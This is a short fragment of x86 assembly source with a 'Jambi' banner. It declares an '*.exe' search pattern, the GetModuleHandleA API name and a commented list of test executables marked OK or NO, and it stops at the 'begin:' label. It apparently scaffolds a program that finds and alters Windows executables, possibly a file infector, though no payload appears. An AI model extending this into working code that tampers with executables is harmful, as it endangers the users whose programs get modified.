;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;                     _______           _     _                     ;;;;;;
;;;;;;                    (_______)         | |   (_)                    ;;;;;;
;;;;;;                         _ _____ ____ | |__  _                     ;;;;;;
;;;;;;                     _  | (____ |    \|  _ \| |                    ;;;;;;
;;;;;;                    | |_| / ___ | | | | |_) ) |                    ;;;;;;
;;;;;;                     \___/\_____|_|_|_|____/|_|                    ;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;; C'est degueulasse


jmp begin
	;; Files
	s_pattern			db	"*.exe", 0

	;; Functions
	s_GetModuleHandle	db	"GetModuleHandleA", 0

	; <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
	;file				db	"./write.exe", 0			; 
	;file				db	"./test/super_pi_mod.exe", 0	;
	;file				db	"./test/Magnify.exe", 0			;
	;file				db	"./test/mspaint.exe", 0			;
	;file				db	"./test/resmon.exe", 0			;
	;file				db	"./test/Photoshop.exe", 0
	;file				db	"./test/AnaT.exe", 0
	;file				db	".\a.exe", 0				; OK
	;file				db	"./test/keygen.exe", 0			; NO
	;file				db	"./test/keyme5.exe", 0			; OK
	;file				db	"./test/CrkGenMe.exe", 0		; OK
	;>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>


	
begin: